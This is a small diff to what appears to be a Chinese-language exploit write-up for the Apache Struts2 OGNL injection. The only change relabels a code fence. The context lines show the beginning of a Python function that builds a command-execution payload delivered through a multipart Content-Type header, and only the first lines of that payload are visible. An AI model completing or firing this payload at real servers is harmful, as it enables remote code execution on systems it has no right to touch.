@@ -9,7 +9,7 @@ Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse
 
 
 ## 命令执行
-```exp
+```python3
 def p(cmd):
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
